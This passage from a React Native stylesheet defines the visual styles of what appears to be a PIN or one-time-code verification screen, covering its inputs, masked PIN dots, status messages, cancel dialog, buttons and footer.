    lineHeight: 22,
  },
  whiteInput: {
    width: '100%',
    height: 44,
    backgroundColor: '#FFFFFF',
    borderRadius: 4,
    paddingHorizontal: 14,
    paddingVertical: 0,
    fontSize: 14,
    fontWeight: '400',
    color: '#1F2937',
    textAlign: 'center',
    textAlignVertical: 'center',
    includeFontPadding: false,
  },
  whiteInputContainer: {
    width: '100%',
    height: 44,
    backgroundColor: '#FFFFFF',
    borderRadius: 4,
    position: 'relative',
    justifyContent: 'center',
    overflow: 'hidden',
  },
  whiteInputInContainer: {
    width: '100%',
    height: '100%',
    paddingHorizontal: 14,
    paddingVertical: 0,
    fontSize: 14,
    fontWeight: '400',
    color: '#1F2937',
    textAlign: 'center',
    textAlignVertical: 'center',
    includeFontPadding: false,
    backgroundColor: 'transparent',
  },
  hiddenInputText: {
    color: 'transparent',
    opacity: 0,
  },
  pinDotsOverlay: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 8,
  },
  geometricPinDot: {
    width: 10,
    height: 10,
    borderRadius: 5,
    backgroundColor: '#1F2937',
  },
  inputDisabled: {
    backgroundColor: '#F1F5F9',
    color: '#94A3B8',
    opacity: 0.85,
  },
  warningRow: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 8,
    gap: 5,
  },
  warningText: {
    color: '#FFFFFF',
    fontSize: 11.5,
    fontWeight: '400',
    lineHeight: 15,
  },
  verifyingRow: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 10,
    gap: 8,
  },
  verifyingText: {
    color: '#FFFFFF',
    fontSize: 11.5,
    fontWeight: '400',
  },
  termsText: {
    color: '#FFFFFF',
    fontSize: 11.5,
    fontWeight: '400',
    marginTop: 14,
    textAlign: 'center',
    opacity: 0.9,
  },
  resendTimerText: {
    color: '#FFFFFF',
    fontSize: 11.5,
    fontWeight: '400',
    marginTop: 10,
    textAlign: 'center',
    opacity: 0.9,
  },
  resendLinkText: {
    color: '#FFFFFF',
    fontSize: 11.5,
    fontWeight: '500',
    textDecorationLine: 'underline',
    textAlign: 'center',
  },
  underlineText: {
    textDecorationLine: 'underline',
    fontWeight: '700',
  },
  statusBox: {
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 14,
  },
  statusTitle: {
    fontSize: 22,
    fontWeight: '700',
    color: '#FFFFFF',
    marginTop: 14,
    textAlign: 'center',
  },
  statusCancelledTitle: {
    fontSize: 18,
    fontWeight: '600',
    color: '#FFFFFF',
    marginTop: 14,
    textAlign: 'center',
  },
  statusSubtitle: {
    fontSize: 14,
    color: '#FFFFFF',
    marginTop: 6,
    textAlign: 'center',
  },
  statusRedirect: {
    fontSize: 12,
    color: '#FFFFFF',
    marginTop: 10,
    textAlign: 'center',
    lineHeight: 20,
  },
  cancelConfirmBox: {
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 24,
    gap: 16,
  },
  cancelConfirmTitle: {
    fontSize: 18,
    fontWeight: '700',
    color: '#FFFFFF',
    textAlign: 'center',
    lineHeight: 26,
    paddingHorizontal: 8,
  },
  cancelYesBtn: {
    flex: 1,
    height: 44,
    backgroundColor: '#F8FAFC',
    borderWidth: 1,
    borderColor: '#CBD5E1',
    borderRadius: 4,
    alignItems: 'center',
    justifyContent: 'center',
  },
  cancelYesBtnText: {
    fontSize: 14,
    fontWeight: '600',
    color: '#334155',
  },
  cancelNoBtn: {
    flex: 1,
    height: 44,
    borderRadius: 4,
    alignItems: 'center',
    justifyContent: 'center',
  },
  cancelNoBtnText: {
    fontSize: 14,
    fontWeight: '600',
    color: '#FFFFFF',
  },
  bottomActionRow: {
    backgroundColor: '#FFFFFF',
    paddingHorizontal: 16,
    paddingTop: 16,
    paddingBottom: 10,
    flexDirection: 'row',
    gap: 12,
    borderTopWidth: 1,
    borderTopColor: '#CBD5E1',
  },
  cancelBtn: {
    flex: 1,
    height: 44,
    backgroundColor: '#F3F4F6',
    borderWidth: 1,
    borderColor: '#E5E7EB',
    borderRadius: 4,
    alignItems: 'center',
    justifyContent: 'center',
  },
  cancelBtnText: {
    fontSize: 14,
    fontWeight: '600',
    color: '#374151',
  },
  confirmBtn: {
    flex: 1,
    height: 44,
    borderRadius: 4,
    alignItems: 'center',
    justifyContent: 'center',
  },
  confirmBtnDisabled: {
    backgroundColor: '#E5E7EB',
  },
  confirmBtnText: {
    fontSize: 14,
    fontWeight: '700',
    color: '#FFFFFF',
  },
  confirmBtnTextDisabled: {
    color: '#9CA3AF',
  },
  footerArea: {
    backgroundColor: '#FFFFFF',
    paddingBottom: 14,
    paddingTop: 4,
    alignItems: 'center',
    justifyContent: 'center',
  },
  footerAreaWithTopBorder: {
    borderTopWidth: 1.5,
    borderTopColor: '#CBD5E1',
    paddingTop: 14,
  },
  supportRow: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 6,
  },
  supportCircle: {
    width: 18,
    height: 18,
    borderRadius: 9,
    alignItems: 'center',
    justifyContent: 'center',
  },
  supportNumber: {
    fontSize: 12,
    fontWeight: '700',
  },
  copyrightText: {
    fontSize: 11,
    color: '#6B7280',
    marginTop: 5,
    textAlign: 'center',
  },
});
